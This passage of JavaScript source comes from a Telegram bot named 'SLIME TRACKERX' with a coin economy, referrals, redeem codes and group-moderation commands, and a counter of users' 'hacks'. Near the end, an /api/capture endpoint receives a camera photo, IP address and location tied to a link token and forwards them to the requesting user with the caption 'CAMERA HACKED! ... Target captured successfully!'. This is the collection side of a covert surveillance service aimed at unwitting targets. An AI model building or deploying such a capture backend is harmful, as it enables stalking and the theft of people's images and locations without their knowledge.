    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    const username = await getUsername(user.id);
    message += `${medal} @${username} - ${user.usedHacks} hacks\n`;
  }
  
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("coin_leaderboard", async (ctx) => {
  const topUsers = Array.from(users.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
  let message = "🏆 **💰 RICHEST USERS** 🏆\n\n";
  
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    const username = await getUsername(user.id);
    message += `${medal} @${username} - ${user.coins} coins\n`;
  }
  
  await ctx.reply(message, { parse_mode: "Markdown" });
});

// ========== REFERRAL INFO ==========
bot.action("referral_info", async (ctx) => {
  const user = initUser(ctx.from.id);
  const link = getReferralLink(ctx.from.id);
  
  await ctx.reply(formatMessage(`
🔗 REFERRAL SYSTEM

Your Referral Link:
${link}

📊 Your Stats:
• Referrals: ${user.referrals}
• Coins Earned: ${user.referrals * REFERRAL_REWARD}
• Total Coins: ${user.coins}

🎁 Rewards:
• ${REFERRAL_REWARD} coins per referral
• 🏆 "Recruiter" badge at 10 referrals
• 💎 Bonus 20 coins at 25 referrals
• 👑 "Elite Referrer" at 50 referrals

Share your link and earn coins!
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]) });
});

// ========== PROFILE ==========
bot.action("profile", async (ctx) => {
  const user = initUser(ctx.from.id);
  const winRate = user.gamesPlayed > 0 ? ((user.gamesWon / user.gamesPlayed) * 100).toFixed(1) : 0;
  
  await ctx.reply(formatMessage(`
👤 USER PROFILE

📝 Basic Info:
• Name: ${ctx.from.first_name}
• Username: @${ctx.from.username || 'None'}
• ID: ${ctx.from.id}

💰 Economy:
• Coins: ${user.coins}
• Bank: ${user.bank}
• Total Earned: ${user.totalEarned}
• Total Spent: ${user.totalSpent}

📊 Stats:
• Level: ${user.level}
• Referrals: ${user.referrals}
• Hacks Used: ${user.usedHacks}
• Games: ${user.gamesWon}W / ${user.gamesLost}L
• Win Rate: ${winRate}%

🏆 Badges:
${user.badges.map(b => `• ${b}`).join('\n')}

Keep playing to earn more rewards!
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("🔄 REFRESH", "profile")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]) });
});

// ========== REDEEM SYSTEM ==========
bot.action("redeem_menu", async (ctx) => {
  await ctx.reply(formatMessage(`
🎁 REDEEM CODE

Enter your redeem code:

Type: /redeem YOUR_CODE

━━━━━━━━━━━━━━━━━━━━━━━━━

Get codes from:
• Giveaways
• Events
• Support channel
  `), { parse_mode: "HTML" });
});

bot.command("redeem", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Usage: /redeem <CODE>");
  }
  
  const code = args[1];
  const result = redeemCode(ctx.from.id, code);
  
  if (result.success) {
    const user = users.get(ctx.from.id);
    await ctx.reply(formatMessage(`
✅ REDEEM SUCCESS!

🎉 ${result.message}

💰 New Balance: ${user.coins} coins
    `));
  } else {
    await ctx.reply(result.message);
  }
});

// ========== GROUP COMMANDS ==========
bot.action("group_menu", async (ctx) => {
  try {
    await ctx.editMessageCaption("👑 GROUP MANAGEMENT\n\nAdmin tools for group moderation!", {
      parse_mode: "HTML",
      ...groupMenu()
    });
  } catch (err) {
    await ctx.reply("👑 GROUP MANAGEMENT\n\nAdmin tools for group moderation!", {
      parse_mode: "HTML",
      ...groupMenu()
    });
  }
});

bot.action("tagall", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return ctx.reply("❌ Group only!");
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) {
    return ctx.reply("❌ Admin only!");
  }
  
  const now = Date.now();
  const lastTag = tagAllCooldown.get(ctx.chat.id) || 0;
  if (now - lastTag < 300000) {
    const minutes = Math.ceil((300000 - (now - lastTag)) / 60000);
    return ctx.reply(`⏰ Please wait ${minutes} minutes before using tag all again!`);
  }
  
  await ctx.reply("🔊 **Tagging members...**", { parse_mode: "Markdown" });
  
  try {
    const admins = await ctx.getChatAdministrators();
    let mentions = "";
    
    for (const admin of admins.slice(0, 50)) {
      mentions += `[@${admin.user.username || admin.user.first_name}](tg://user?id=${admin.user.id}) `;
    }
    
    await ctx.reply(`📢 **Announcement from Admin**\n\n${mentions}`, { parse_mode: "Markdown" });
    tagAllCooldown.set(ctx.chat.id, now);
  } catch (err) {
    ctx.reply("❌ Failed to tag members. Make sure I'm admin!");
  }
});

bot.action("set_welcome", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return ctx.reply("❌ Admin only!");
  await ctx.reply("📝 Send the welcome message you want to set.\n\nUse: `/setwelcome Your welcome message here`\n\nVariables: {name} - user's name, {group} - group name");
});

bot.command("setwelcome", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) return ctx.reply("Usage: /setwelcome <message>");
  welcomeMessages.set(ctx.chat.id, message);
  await ctx.reply(`✅ Welcome message set!\n\n${message}`);
});

bot.action("set_goodbye", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return ctx.reply("❌ Admin only!");
  await ctx.reply("📝 Send the goodbye message you want to set.\n\nUse: `/setgoodbye Your goodbye message here`");
});

bot.command("setgoodbye", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) return ctx.reply("Usage: /setgoodbye <message>");
  goodbyeMessages.set(ctx.chat.id, message);
  await ctx.reply(`✅ Goodbye message set!\n\n${message}`);
});

bot.on("new_chat_members", async (ctx) => {
  const welcomeMsg = welcomeMessages.get(ctx.chat.id);
  if (!welcomeMsg) return;
  for (const member of ctx.message.new_chat_members) {
    if (member.id === bot.botInfo.id) continue;
    const text = welcomeMsg.replace("{name}", member.first_name).replace("{group}", ctx.chat.title);
    await ctx.reply(text);
  }
});

bot.on("left_chat_member", async (ctx) => {
  const goodbyeMsg = goodbyeMessages.get(ctx.chat.id);
  if (!goodbyeMsg) return;
  const member = ctx.message.left_chat_member;
  if (member.id === bot.botInfo.id) return;
  const text = goodbyeMsg.replace("{name}", member.first_name).replace("{group}", ctx.chat.title);
  await ctx.reply(text);
});

bot.action("warn_user", async (ctx) => {
  await ctx.reply("⚠️ Reply to a user's message with `/warn` to warn them.\n\n3 warnings = automatic ban!");
});

bot.command("warn", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to warn them!");
  const userId = reply.from.id;
  const warns = (userWarnings.get(userId) || 0) + 1;
  userWarnings.set(userId, warns);
  await ctx.reply(`⚠️ ${reply.from.first_name} warned! (${warns}/3)`);
  if (warns >= 3) {
    await ctx.telegram.banChatMember(ctx.chat.id, userId);
    userWarnings.delete(userId);
    await ctx.reply(`🚫 ${reply.from.first_name} banned for 3 warnings!`);
  }
});

bot.action("kick_user", async (ctx) => {
  await ctx.reply("🔨 Reply to a user's message with `/kick` to kick them.");
});

bot.command("kick", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to kick!");
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await ctx.telegram.unbanChatMember(ctx.chat.id, reply.from.id);
  await ctx.reply(`👢 ${reply.from.first_name} kicked!`);
});

bot.action("ban_user", async (ctx) => {
  await ctx.reply("🚫 Reply to a user's message with `/ban` to ban them.");
});

bot.command("ban", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to ban!");
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await ctx.reply(`🚫 ${reply.from.first_name} banned!`);
});

bot.action("mute_user", async (ctx) => {
  await ctx.reply("🔇 Reply to a user's message with `/mute <minutes>` to mute them.\nExample: `/mute 30`");
});

bot.command("mute", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  const args = ctx.message.text.split(" ");
  const minutes = parseInt(args[1]) || 30;
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to mute!");
  const untilDate = Math.floor(Date.now() / 1000) + (minutes * 60);
  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, reply.from.id, {
      until_date: untilDate,
      can_send_messages: false
    });
    await ctx.reply(`🔇 ${reply.from.first_name} muted for ${minutes} minutes!`);
  } catch (err) {
    ctx.reply("❌ Failed to mute. Make sure I'm admin!");
  }
});

bot.command("unmute", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to unmute!");
  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, reply.from.id, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true
    });
    await ctx.reply(`🔊 ${reply.from.first_name} unmuted!`);
  } catch (err) {
    ctx.reply("❌ Failed to unmute.");
  }
});

bot.action("antilink_toggle", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  if (antilinkGroups.has(ctx.chat.id)) {
    antilinkGroups.delete(ctx.chat.id);
    await ctx.reply("🚫 Anti-link DISABLED!");
  } else {
    antilinkGroups.add(ctx.chat.id);
    await ctx.reply("✅ Anti-link ENABLED! Links will be deleted.");
  }
});

bot.action("antispam_toggle", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  if (antispamGroups.has(ctx.chat.id)) {
    antispamGroups.delete(ctx.chat.id);
    await ctx.reply("🛡️ Anti-spam DISABLED!");
  } else {
    antispamGroups.add(ctx.chat.id);
    await ctx.reply("✅ Anti-spam ENABLED! Spammers will be muted.");
  }
});

bot.on("text", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  if (antilinkGroups.has(ctx.chat.id)) {
    const text = ctx.message.text;
    if (text.includes("http://") || text.includes("https://") || text.includes("t.me/")) {
      await ctx.deleteMessage();
      await ctx.reply(`🚫 Links are not allowed! ${ctx.from.first_name}, please don't share links.`);
      return;
    }
  }
  
  if (antispamGroups.has(ctx.chat.id)) {
    const userId = ctx.from.id;
    const now = Date.now();
    const userSpam = antispamUsers.get(userId) || [];
    const recent = userSpam.filter(t => now - t < 5000);
    if (recent.length >= 3) {
      await ctx.telegram.restrictChatMember(ctx.chat.id, userId, {
        until_date: Math.floor(now / 1000) + 60,
        can_send_messages: false
      });
      await ctx.reply(`🛡️ ${ctx.from.first_name} has been muted for spamming!`);
      antispamUsers.delete(userId);
    } else {
      recent.push(now);
      antispamUsers.set(userId, recent);
    }
  }
});

bot.action("group_stats", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  const chat = await ctx.getChat();
  const admins = await ctx.getChatAdministrators();
  const memberCount = await ctx.telegram.getChatMembersCount(ctx.chat.id);
  await ctx.reply(formatMessage(`
📊 GROUP STATISTICS

📝 Group Info:
• Name: ${chat.title}
• Members: ${memberCount}
• Admins: ${admins.length}

⚙️ Settings:
• Anti-link: ${antilinkGroups.has(ctx.chat.id) ? "✅ ON" : "❌ OFF"}
• Anti-spam: ${antispamGroups.has(ctx.chat.id) ? "✅ ON" : "❌ OFF"}
• Welcome: ${welcomeMessages.has(ctx.chat.id) ? "✅ SET" : "❌ NOT SET"}
• Goodbye: ${goodbyeMessages.has(ctx.chat.id) ? "✅ SET" : "❌ NOT SET"}

📈 Activity:
• Total warns: ${userWarnings.size}
  `));
});

// ========== SIMPLE COMMANDS ==========
bot.command("balance", async (ctx) => {
  const user = initUser(ctx.from.id);
  await ctx.reply(`💰 Your balance: ${user.coins} coins`);
});

bot.command("daily", async (ctx) => {
  const user = initUser(ctx.from.id);
  const now = Date.now();
  const dayInMs = 24 * 60 * 60 * 1000;
  
  if (user.lastDaily && (now - user.lastDaily) < dayInMs) {
    const remaining = dayInMs - (now - user.lastDaily);
    const hours = Math.floor(remaining / 3600000);
    return ctx.reply(`⏰ Already claimed! Come back in ${hours} hours.`);
  }
  
  let streak = user.dailyStreak || 0;
  if (user.lastDaily && (now - user.lastDaily) < dayInMs * 2) {
    streak++;
  } else {
    streak = 1;
  }
  
  const bonus = Math.min(streak, 10);
  const reward = DAILY_REWARD + bonus;
  
  addCoins(ctx.from.id, reward, "Daily reward");
  user.dailyStreak = streak;
  user.lastDaily = now;
  users.set(ctx.from.id, user);
  
  await ctx.reply(`🎁 Daily reward: +${reward} coins!\n🔥 Streak: ${streak} days\n💰 New balance: ${user.coins + reward}`);
});

bot.command("work", async (ctx) => {
  const userId = ctx.from.id;
  const now = Date.now();
  const lastWork = userWorkCooldown.get(userId) || 0;
  
  if (now - lastWork < WORK_COOLDOWN) {
    const remaining = WORK_COOLDOWN - (now - lastWork);
    const hours = Math.floor(remaining / 3600000);
    const minutes = Math.floor((remaining % 3600000) / 60000);
    return ctx.reply(`⏰ Rest for ${hours}h ${minutes}m before working again.`);
  }
  
  const jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Gamer", "🛒 Shopper"];
  const job = jobs[Math.floor(Math.random() * jobs.length)];
  const reward = Math.floor(Math.random() * (WORK_MAX - WORK_MIN + 1) + WORK_MIN);
  
  addCoins(userId, reward, `Worked as ${job}`);
  userWorkCooldown.set(userId, now);
  
  await ctx.reply(`💼 Worked as ${job}! +${reward} coins!\n💰 New balance: ${users.get(userId).coins}`);
});

bot.command("profile", async (ctx) => {
  const user = initUser(ctx.from.id);
  await ctx.reply(formatMessage(`
👤 PROFILE

Name: ${ctx.from.first_name}
ID: ${ctx.from.id}

💰 Coins: ${user.coins}
👥 Referrals: ${user.referrals}
🔧 Hacks Used: ${user.usedHacks}
🎮 Games: ${user.gamesWon}W / ${user.gamesLost}L
📅 Joined: ${new Date(user.joinDate).toLocaleDateString()}
  `));
});

// ========== ADMIN COMMANDS (OWNER ONLY) ==========
bot.command("admin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  await ctx.reply(`
👑 ADMIN PANEL

💰 /addcoins @user amount
🎁 /gencode coins uses hours
📋 /codes
🗑️ /delcode CODE
📢 /broadcast message
👥 /users
📊 /stats

Example:
/addcoins @Mrddev 100
/gencode 50 20 24
/broadcast Hello!
  `);
});

bot.command("addcoins", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Usage: /addcoins @user amount");
  const username = args[1].replace("@", "");
  const amount = parseInt(args[2]);
  if (isNaN(amount)) return ctx.reply("Amount must be a number!");
  
  for (const [id, user] of users) {
    try {
      const chat = await ctx.telegram.getChat(id);
      if (chat.username === username) {
        user.coins += amount;
        user.totalEarned += amount;
        users.set(id, user);
        await ctx.reply(`✅ Added ${amount} coins to @${username}! New balance: ${user.coins}`);
        return;
      }
    } catch(e) {}
  }
  ctx.reply(`❌ User @${username} not found!`);
});

bot.command("gencode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  const args = ctx.message.text.split(" ");
  const coins = parseInt(args[1]) || 50;
  const uses = Math.min(parseInt(args[2]) || 20, 20);
  const hours = parseInt(args[3]) || 24;
  const code = generateRedeemCode(coins, uses, hours);
  await ctx.reply(`✅ CODE GENERATED!\n\nCode: \`${code}\`\n💰 ${coins} coins\n🔄 ${uses} uses\n⏱️ ${hours} hours`, { parse_mode: "Markdown" });
});

bot.command("codes", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  if (redeemCodes.size === 0) return ctx.reply("No active codes.");
  let msg = "📋 ACTIVE CODES:\n\n";
  for (const [code, data] of redeemCodes) {
    msg += `\`${code}\` - ${data.coins} coins - ${data.remainingUses} uses left\n`;
  }
  await ctx.reply(msg, { parse_mode: "Markdown" });
});

bot.command("delcode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /delcode CODE");
  const code = args[1].toUpperCase();
  if (redeemCodes.has(code)) {
    redeemCodes.delete(code);
    await ctx.reply(`✅ Code ${code} deleted!`);
  } else {
    await ctx.reply(`❌ Code ${code} not found!`);
  }
});

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) return ctx.reply("Usage: /broadcast message");
  await ctx.reply("📢 Sending broadcast...");
  let success = 0, failed = 0;
  for (const [userId] of users) {
    try {
      await ctx.telegram.sendMessage(userId, `📢 ANNOUNCEMENT\n\n${message}`);
      success++;
    } catch(e) { failed++; }
  }
  await ctx.reply(`✅ Broadcast sent!\n\n✅ Success: ${success}\n❌ Failed: ${failed}`);
});

bot.command("users", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  let msg = "📋 USERS LIST:\n\n";
  let count = 0;
  for (const [id, user] of users) {
    count++;
    msg += `${count}. ID: ${id} - ${user.coins} coins\n`;
    if (count >= 20) break;
  }
  msg += `\nTotal: ${users.size} users`;
  await ctx.reply(msg);
});

bot.command("stats", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  const totalCoins = Array.from(users.values()).reduce((sum, u) => sum + u.coins, 0);
  await ctx.reply(`
🤖 BOT STATS:

👥 Users: ${users.size}
💰 Total Coins: ${totalCoins}
🎯 Hacks Used: ${botStats.totalHacksUsed}
🎁 Referrals: ${botStats.totalReferrals}
📦 Active Codes: ${redeemCodes.size}
  `);
});

// ========== CHAT WITH DEV ==========
bot.command("chat", async (ctx) => {
  activeChats.set(ctx.chat.id, true);
  await ctx.reply(`
💬 CHAT MODE ACTIVE

✅ You can now message the developer!

📨 Instructions:
• Send any message
• Dev will reply here
• Type /exit to leave

Response time: Usually within minutes
  `);
});

bot.command("exit", async (ctx) => {
  if (activeChats.has(ctx.chat.id)) {
    activeChats.delete(ctx.chat.id);
    await ctx.reply("✅ Exited chat mode. Type /chat to start again.");
  } else {
    await ctx.reply("⚠️ You are not in chat mode!");
  }
});

// ========== MESSAGE HANDLER ==========
bot.on("text", async (ctx) => {
  const chatId = ctx.chat.id;
  const msg = ctx.message;
  if (!msg.text || msg.text.startsWith("/")) return;
  
  botStats.totalMessages++;
  
  // Owner reply system
  if (chatId === OWNER_ID && msg.reply_to_message) {
    const replyText = msg.reply_to_message.text || "";
    const match = replyText.match(/ID: (\d+)/);
    if (match) {
      const userId = parseInt(match[1]);
      try {
        await ctx.telegram.sendMessage(userId, `💬 Reply from owner:\n\n${msg.text}`);
        await ctx.reply("✅ Reply sent!");
      } catch (err) {
        await ctx.reply("❌ Failed to send reply.");
      }
      return;
    }
  }
  
  // User to owner chat
  if (activeChats.has(chatId)) {
    try {
      await ctx.telegram.sendMessage(OWNER_ID, `
📨 New Message from User

👤 Name: ${msg.from.first_name}
🔗 Username: @${msg.from.username || 'None'}
🆔 ID: ${chatId}

💬 Message:
${msg.text}

Reply to this message to respond.
      `);
      await ctx.reply("✅ Message sent to owner!");
    } catch (err) {
      await ctx.reply("❌ Failed to send message.");
    }
  }
  
  addXP(chatId, 1);
});

// ========== API ENDPOINT ==========
app.post("/api/capture", async (req, res) => {
  try {
    const { image, token, ip, location } = req.body;
    if (!token || !activeTokens.has(token)) return res.status(400).json({ error: "Invalid token" });
    const tokenData = activeTokens.get(token);
    if (image) {
      const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
      await bot.telegram.sendPhoto(tokenData.chatId, { source: buffer }, {
        caption: formatMessage(`
📸 CAMERA HACKED!

🌐 IP: ${ip || "Unknown"}
📍 Location: ${location || "Unknown"}
🕐 Time: ${new Date().toLocaleString()}

Target captured successfully!
        `)
      });
    }
    activeTokens.delete(token);
    res.json({ status: "success" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

// ========== SERVE FRONTEND ==========
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));

bot.launch().then(() => {
  console.log(`🤖 SLIME TRACKERX v${BOT_VERSION} is LIVE!`);
  console.log(`🟢⚡ Bot: @trackersxbot`);
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
